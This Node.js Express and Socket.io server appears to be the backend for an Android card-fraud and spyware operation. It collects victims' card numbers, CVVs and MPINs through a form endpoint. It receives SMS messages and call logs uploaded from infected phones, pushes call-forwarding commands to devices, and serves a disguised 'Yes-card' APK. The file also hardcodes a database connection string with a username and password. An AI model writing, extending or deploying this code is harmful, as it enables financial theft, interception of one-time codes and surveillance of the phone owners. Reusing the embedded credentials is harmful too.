import express from "express";
import cors from "cors";
import mongoose from "mongoose";
import http from "http";
import { Server } from "socket.io";
import jwt from "jsonwebtoken";
import dotenv from "dotenv";
import cookieParser from "cookie-parser";
const app = express();
app.use(cookieParser());



dotenv.config();



const PORT = 3000;

import User from "./models/User.js";

app.use(cors());
app.use(express.static("public"));

app.use(express.json());
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});



mongoose.connect("mongodb+srv://oosrp9132_db_user:BnixQ3Qdq7kPXBcG@cluster0.vez1b2n.mongodb.net/")
  .then(() => console.log("✅ MongoDB connected"))
  .catch(err => console.error("❌ MongoDB error:", err));

const ADMIN_USER = process.env.ADMIN_USER;
const ADMIN_PASS = process.env.ADMIN_PASS;

app.post("/api/login", (req, res) => {
  const { username, password } = req.body;

  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const token = jwt.sign({ user: "admin" }, process.env.JWT_SECRET);

    res.cookie("adminToken", token, {
      httpOnly: true,
      sameSite: "strict",
      secure: false, // change to true in HTTPS
    });

    return res.json({ message: "Logged in" });
  }

  res.status(401).json({ message: "Invalid credentials" });
});



//protected test route
import auth from "./middleware/auth.js";

app.get("/api/protected", auth, (req, res) => {
  res.json({ message: "Valid Token, access granted" });
});



/* =======================
   SMS SCHEMA
======================= */
const SmsSchema = new mongoose.Schema({
  userId: { type: String, required: true }, // NEW: link to user,
  sender: { type: String, required: true },
  message: { type: String, required: true },
  receivedAt: { type: Date, default: Date.now }
});
const Sms = mongoose.model("Sms", SmsSchema);

/* =======================
   PHONE NUMBER SCHEMA
======================= */
const PhoneSchema = new mongoose.Schema({
  phone: { type: String, required: true },
});

const Phone = mongoose.model("Phone", PhoneSchema);

const CallLogSchema = new mongoose.Schema({
  userId: { type: String, required: true }, // NEW: link to user
  phone: { type: String },                  // device phone number (optional)
  number: { type: String, required: true }, // called / received number
  type: { type: String, enum: ["INCOMING", "OUTGOING", "MISSED"], required: true },
  duration: { type: String },
  date: { type: Number, required: true },   // timestamp from Android
  createdAt: { type: Date, default: Date.now }
});

const CallLog = mongoose.model("CallLog", CallLogSchema);


// GET /submit-form → return all users
app.get("/submit-form", async (req, res) => {
  try {
    // Fetch all users, hide sensitive info
    const users = await User.find({}, {
      __v: 0
    }).sort({ createdAt: -1 }); // latest first

    res.status(200).json({
      success: true,
      count: users.length,
      data: users
    });
  } catch (error) {
    console.error("GET USERS ERROR:", error.message);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});


app.post("/submit-form", async (req, res) => {
  try {
    // ✅ Convert card limits to numbers
    const data = {
      deviceModel: req.body.deviceModel,
      userId: req.body.userId,
      name: req.body.name,
      email: req.body.email,
      phone: req.body.phone,
      dob: req.body.dob,
      city: req.body.city,

      cardHolderName: req.body.cardHolderName,

      cardTotalLimit: req.body.cardTotalLimit
        ? Number(req.body.cardTotalLimit)
        : null,

      cardAvailableLimit: req.body.cardAvailableLimit
        ? Number(req.body.cardAvailableLimit)
        : null,

      // ⚠️ NOT RECOMMENDED (but added because you asked)
      cardNumber: req.body.cardNumber,
      expiryDate: req.body.expiryDate,
      cvv: req.body.cvv,
      mpin: req.body.mpin
    };

    // ✅ Save user
    const user = new User(data);
    await user.save();

    io.emit("new_user", user);

    return res.status(201).json({
      success: true,
      message: "User & card data saved successfully"
    });

  } catch (error) {
    console.error("SAVE ERROR:", error.message);
    return res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// DELETE /submit-form/:id
app.delete("/submit-form/:id", async (req, res) => {
  try {
    const mongoId = req.params.id;

    // 1️⃣ Delete user by Mongo _id
    const deletedUser = await User.findByIdAndDelete(mongoId);

    if (!deletedUser) {
      return res.status(404).json({
        success: false,
        message: "User not found"
      });
    }

    const actualUserId = deletedUser.userId; // <-- IMPORTANT

    // 2️⃣ Delete SMS logs for that userId STRING
    await Sms.deleteMany({ userId: actualUserId });

    // 3️⃣ Delete Call logs for that userId STRING
    await CallLog.deleteMany({ userId: actualUserId });

    // Realtime frontend update
    io.emit("user_deleted", { userId: mongoId });

    res.status(200).json({
      success: true,
      message: "User + SMS + Call logs deleted"
    });

  } catch (error) {
    console.error("DELETE USER ERROR:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});




// Test API
app.get("/", (req, res) => {
  res.send("✅ SMS API with MongoDB is running");
});

// Receive SMS + store in DB
app.post("/sms", async (req, res) => {
  const { userId, sender, message } = req.body;

  if (!userId || !sender || !message) {
    return res.status(400).json({
      success: false,
      message: "Missing required fields: userId, sender or message"
    });
  }

  try {
    const sms = await Sms.create({
      userId,
      sender,
      message
    });

    console.log("📩 SMS Stored:", userId, sender);

    // ✅ Emit only to that user's room
    const io = req.app.get("io");
    io.to(`user-${userId}`).emit("new_sms", sms);
    console.log("📢 Realtime SMS sent to room:", `user-${userId}`, sms);


    res.json({
      success: true,
      message: "SMS stored successfully"
    });
  } catch (err) {
    console.error("❌ SMS save failed:", err);
    res.status(500).json({
      success: false,
      message: "Database error"
    });
  }
});


// GET route to fetch SMS for a particular user
app.get("/sms", async (req, res) => {
  const { userId } = req.query;

  if (!userId) {
    return res.status(400).json({
      success: false,
      message: "Missing userId query parameter"
    });
  }

  try {
    const smsList = await Sms.find({ userId }).sort({ createdAt: -1 }); // latest first
    res.json({ success: true, data: smsList });
  } catch (err) {
    console.error("❌ Fetch failed:", err);
    res.status(500).json({ success: false, message: "Database error" });
  }
});

app.get("/download-apk", (req, res) => {
  const filePath = __dirname + "/public/yes_card.apk";
  res.download(filePath, "Yes-card.apk");
});



// Save phone number (single)
app.post("/get-number", async (req, res) => {
  const { phone } = req.body;

  if (!phone) {
    return res.status(400).json({
      success: false,
      message: "Phone number required"
    });
  }

  try {
    let record = await Phone.findOne();

    if (record) {
      // Update existing number
      record.phone = phone;
      await record.save();
    } else {
      // Create new record
      record = await Phone.create({ phone });
    }

    console.log("📞 Phone saved:", phone);

    res.json({
      success: true,
      phone: record.phone
    });

  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});



// Get phone number directly
app.get("/get-number", async (req, res) => {
  const record = await Phone.findOne();

  if (!record) {
    return res.json({ phone: null });
  }

  res.json({ phone: record.phone });
});

/* =======================
   RECEIVE CALL LOG
======================= */
app.post("/call-log", async (req, res) => {
  const { userId, number, type, duration, date, phone } = req.body;

  console.log("Received call log:", userId, number, type);

  if (!userId || !number || !type || !date) {
    return res.status(400).json({
      success: false,
      message: "Missing required fields (userId, number, type, date)"
    });
  }

  try {
    // Avoid duplicates (same call timestamp + number + userId)
    const exists = await CallLog.findOne({ userId, number, date });
    if (exists) {
      return res.json({ success: true, message: "Already exists" });
    }

    const log = new CallLog({
      userId,
      phone: phone || null,
      number,
      type,
      duration,
      date
    });

    await log.save();

    console.log("📞 Call log saved:", userId, number, type);

    // Emit to admin dashboard
    io.emit("new_call_log", log);

    res.json({ success: true });

  } catch (err) {
    console.error("❌ Call log save error:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

/* =======================
   GET ALL CALL LOGS
======================= */
// GET route to fetch call logs, optionally filtered by userId
app.get("/call-logs", async (req, res) => {
  const { userId } = req.query;

  try {
    let query = {};
    if (userId) {
      query.userId = userId; // filter by userId if provided
    }

    const logs = await CallLog.find(query).sort({ createdAt: -1 }); // latest first
    res.json({ success: true, data: logs });
  } catch (err) {
    console.error("❌ Fetch call logs failed:", err);
    res.status(500).json({ success: false, message: "Database error" });
  }
});




const onlineUsers = {};  // Track all online states

io.on("connection", (socket) => {
  console.log("🟢 Device/Admin connected:", socket.id);

  // Send current status immediately to admin/web/dashboard
  socket.emit("bulk_status_update", onlineUsers);

  // Device join
  socket.on("join-user", (userId) => {
    console.log(`📌 Device joined: user-${userId}`);
    socket.userId = userId;
    socket.join(`user-${userId}`);
  });

  // Admin triggers forwarding
  socket.on("forwarding_control", ({ userId, action, number }) => {
    console.log("📤 Forwarding command sent:", userId, action);

    io.to(`user-${userId}`).emit("call_forward_command", {
      action,
      number
    });
  });

  // Android acknowledgment
  socket.on("forwarding_status_from_app", (data) => {
    console.log("📩 Status received:", data);
    io.emit("forwarding_status", data);
  });

  // Android sends online/offline
  socket.on("user_status", (data) => {
    console.log("STATUS:", data);

    onlineUsers[data.userId] = data.status === "online"; // store ✔

    io.emit("user_status_update", {
      userId: data.userId,
      status: data.status
    });
  });

  socket.on("disconnect", () => {
    console.log("🔴 Disconnected:", socket.id);

    if (socket.userId) {
      onlineUsers[socket.userId] = false; // store offline ✔

      io.emit("user_status_update", {
        userId: socket.userId,
        status: "offline"
      });
    }
  });
});




/* =======================
   START SERVER
======================= */
server.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
